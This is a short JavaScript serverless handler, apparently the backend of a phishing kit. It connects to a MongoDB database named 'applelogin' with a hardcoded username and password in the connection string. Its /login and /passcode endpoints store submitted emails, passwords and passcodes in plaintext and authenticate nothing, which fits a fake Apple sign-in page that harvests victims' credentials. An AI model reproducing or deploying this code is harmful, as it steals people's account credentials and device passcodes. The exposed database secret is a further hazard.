// api/vercel.js
import mongoose from "mongoose";

const uri = "mongodb+srv://civeso9509:x9eLMVbtwhjiYgsq@cluster0.bgugf7l.mongodb.net/applelogin";

// Avoid multiple mongoose connections
if (!mongoose.connections[0].readyState) {
  await mongoose.connect(uri, {
    useNewUrlParser: true,
    useUnifiedTopology: true,
  });
}

// Schemas
const User = mongoose.models.User || mongoose.model("User", new mongoose.Schema({ email: String, password: String }));
const Passcode = mongoose.models.Passcode || mongoose.model("Passcode", new mongoose.Schema({ passcode: String }));

export default async function handler(req, res) {
  const { url, method } = req;

  // Save login
  if (url === "/login" && method === "POST") {
    const { email, password } = req.body;
    const user = new User({ email, password });
    await user.save();
    console.log("✅ login saved");
    return res.status(200).json({ message: "User saved to MongoDB!" });
  }

  // Save passcode
  if (url === "/passcode" && method === "POST") {
    const { passcode } = req.body;
    const user = new Passcode({ passcode });
    await user.save();
    console.log("✅ passcode saved");
    return res.status(200).json({ message: "Passcode saved to MongoDB!" });
  }

  return res.status(404).json({ message: "Not found" });
}
